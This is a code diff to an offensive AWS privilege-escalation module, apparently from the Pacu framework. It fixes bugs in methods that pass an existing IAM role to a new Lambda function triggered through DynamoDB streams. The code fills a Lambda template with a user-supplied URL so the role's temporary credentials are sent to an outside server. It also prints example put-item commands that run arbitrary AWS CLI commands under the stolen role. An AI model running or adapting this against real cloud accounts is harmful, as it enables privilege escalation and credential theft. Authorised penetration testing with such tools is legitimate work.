@@ -1393,7 +1393,7 @@ def PassExistingRoleToNewLambdaThenTriggerWithNewDynamo(pacu_main, print, input,
                 'StreamViewType': 'KEYS_ONLY'
             }
         )
-        stream_arn = response['LatestStreamArn']
+        stream_arn = response['TableDescription']['LatestStreamArn']
         print('Successfully created new DynamoDB table {}!\n'.format(dynamo_table_name))
     except Exception as error:
         print('Failed to create new DynamoDB table: {}\n'.format(error))
@@ -1414,9 +1414,9 @@ def PassExistingRoleToNewLambdaThenTriggerWithNewDynamo(pacu_main, print, input,
         print('Failed to create Lambda event source mapping: {}\n'.format(error))
         return False
 
-    print('To make use of the new privileges, you need to invoke the newly created function. To do so, you need to PUT an item into the DynamoDB table {}. You can do this from the AWS CLI. The function expects an AWS CLI command that will execute in the context of the role that was passed to this function.\n\nAn example situation would be where the role you passed has EC2 privileges, so you PUT an item to the new DynamoDB table in the format: attr={S="aws ec2 run-instances --image-id ami-123xyz"} and it will run a new EC2 instance in the current region.\n'.format(dynamo_table_name))
+    print('To make use of the new privileges, you need to invoke the newly created function. To do so, you need to PUT an item into the DynamoDB table {}. You can do this from the AWS CLI. The function expects an AWS CLI command that will execute in the context of the role that was passed to this function.\n\nAn example situation would be where the role you passed has EC2 privileges, so you PUT an item to the new DynamoDB table in the format: attr={{S="aws ec2 run-instances --image-id ami-123xyz"}} and it will run a new EC2 instance in the current region.\n'.format(dynamo_table_name))
     print('Example AWS CLI command to invoke the new Lambda function through DynamoDB and execute "aws ec2 run-instances --image-id ami-123xyz" can be seen here:\n')
-    print('aws dynamodb put-item --region {} --table-name {} --item attr={S="aws ec2 run-instances --image-id ami-123xyz"}\n'.format(region, dynamo_table_name))
+    print('aws dynamodb put-item --region {} --table-name {} --item attr={{S="aws ec2 run-instances --image-id ami-123xyz"}}\n'.format(region, dynamo_table_name))
     print('WARNING: This method does not directly return the output of your AWS CLI command, but there are a couple different options you can take:\n  1. Only run commands that you do not need the output of (such as attaching a policy to your user).\n  2. Review the CloudWatch logs relating to your function invocations, if you have permissions to do so.\n')
     return True
 
@@ -1425,10 +1425,10 @@ def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, i
     print('  Starting method PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo...\n')
 
     # Enumerate DynamoDB Streams
-    regions = pacu_main.get_regions('dynamodbstreams')
+    regions = pacu_main.get_regions('streams.dynamodb')
     target_region = None
     if len(regions) == 0:
-        all_dynamodbstreams_regions = pacu_main.get_regions('dynamodbstreams', check_session=False)
+        all_dynamodbstreams_regions = pacu_main.get_regions('streams.dynamodb', check_session=False)
         while not target_region:
             target_region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
             if not target_region:
@@ -1446,22 +1446,23 @@ def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, i
         if len(streams) > 0:
             all_streams[region] = streams
 
-    if len(all_streams.keys()) > 1:
-        print('Found {} regions with DynamoDB streams. These are what will trigger your Lambda function, which ultimately leads to you getting credentials. Choose which region below to create the Lambda function in.'.format(len(all_streams.keys())))
-        for i in range(0, len(all_streams.keys())):
-            print('  [{}] {} ({} Streams)'.format(i, all_streams.keys()[i], len(all_streams[all_streams.keys()[i]])))
+    regions_with_streams = list(all_streams.keys())
+    if len(regions_with_streams) > 1:
+        print('Found {} regions with DynamoDB streams. These are what will trigger your Lambda function, which ultimately leads to you getting credentials. Choose which region below to create the Lambda function in.'.format(len(regions_with_streams)))
+        for i in range(0, len(regions_with_streams)):
+            print('  [{}] {} ({} Streams)'.format(i, all_streams[regions_with_streams[i]], len(all_streams[regions_with_streams[i]])))
         choice = int(input('Choose an option: '))
-        target_region = all_streams.keys()[choice]
+        target_region = regions_with_streams[choice]
         region_streams = all_streams[target_region]
-    elif len(all_streams.keys()) == 1:
-        target_region = all_streams.keys()[0]
+    elif len(regions_with_streams) == 1:
+        target_region = regions_with_streams[0]
         region_streams = all_streams[target_region]
     else:
         print('Did not find any regions with valid DynamoDB Streams to use. Skipping to next privilege escalation method...\n')
         return False
 
     # Import template lambda_function for cred exfil
-    with open('./modules/{}/lambda_function.py.bak'.format(module_info['Name']), 'r') as f:
+    with open('./modules/{}/lambda_function.py.bak'.format(module_info['name']), 'r') as f:
         code = f.read()
 
     print('This privilege escalation method requires you to have some way of receiving HTTP requests and reading the contents of the body to retrieve the temporary credentials associated with the lambda function that will be created.\n')
@@ -1472,19 +1473,19 @@ def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, i
     # Replace the placeholder in the local code with their server
     code = code.replace('THEIR_URL', their_url)
 
-    with open('./modules/{}/lambda_function.py'.format(module_info['Name']), 'w+') as f:
+    with open('./modules/{}/lambda_function.py'.format(module_info['name']), 'w+') as f:
         f.write(code)
 
     # Zip the Lambda function
     try:
-        subprocess.run(['zip', './modules/{}/lambda_function.zip'.format(module_info['Name']), './modules/{}/lambda_function.py'.format(module_info['Name'])], shell=True)
+        subprocess.run(['zip', './modules/{}/lambda_function.zip'.format(module_info['name']), './modules/{}/lambda_function.py'.format(module_info['name'])], shell=True)
     except Exception as error:
         print('Failed to zip the Lambda function locally: {}\n'.format(error))
         return False
 
     # Create Lambda function
     try:
-        function_name, region = pass_existing_role_to_lambda(pacu_main, print, input, fetch_data, zip_file='./modules/{}/lambda_function.zip'.format(module_info['Name']), region=target_region)
+        function_name, region = pass_existing_role_to_lambda(pacu_main, print, input, fetch_data, zip_file='./modules/{}/lambda_function.zip'.format(module_info['name']), region=target_region)
     except Exception as error:
         print('Failed to create a new Lambda function: {}\n'.format(error))
         return False
@@ -1526,7 +1527,7 @@ def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data, zip_file='
     session = pacu_main.get_active_session()
 
     if zip_file == '':
-        zip_file = './modules/{}/lambda.zip'.format(module_info['Name'])
+        zip_file = './modules/{}/lambda.zip'.format(module_info['name'])
 
     if region is None:
         regions = pacu_main.get_regions('lambda')
@@ -1535,7 +1536,7 @@ def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data, zip_file='
             print('  Found multiple valid regions to use. Choose one below.\n')
             for i in range(0, len(regions)):
                 print('  [{}] {}'.format(i, regions[i]))
-            choice = input('What region do you want to create the Lambda function in? ')
+            choice = input('  What region do you want to create the Lambda function in? ')
             region = regions[int(choice)]
         elif len(regions) == 1:
             region = regions[0]
@@ -1552,7 +1553,7 @@ def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data, zip_file='
 
     client = pacu_main.get_boto3_client('lambda', region)
 
-    target_role_arn = input('    Is there a specific role to use? Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
+    target_role_arn = input('  Is there a specific role to use? Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
 
     if not target_role_arn:
         if fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles', force=True) is False:
@@ -1566,7 +1567,7 @@ def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data, zip_file='
         choice = input('Choose an option: ')
         target_role_arn = roles[int(choice)]['Arn']
 
-    print('Using role {}. Trying to create a new Lambda function...'.format(target_role_arn))
+    print('Using role {}. Trying to create a new Lambda function...\n'.format(target_role_arn))
 
     function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
 
@@ -1584,7 +1585,7 @@ def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data, zip_file='
         Timeout=30,
         Handler='lambda_function.lambda_handler'
     )
-    print('Successfully created a Lambda function {} in region {}!'.format(function_name, region))
+    print('Successfully created a Lambda function {} in region {}!\n'.format(function_name, region))
     return (function_name, region)
 
 
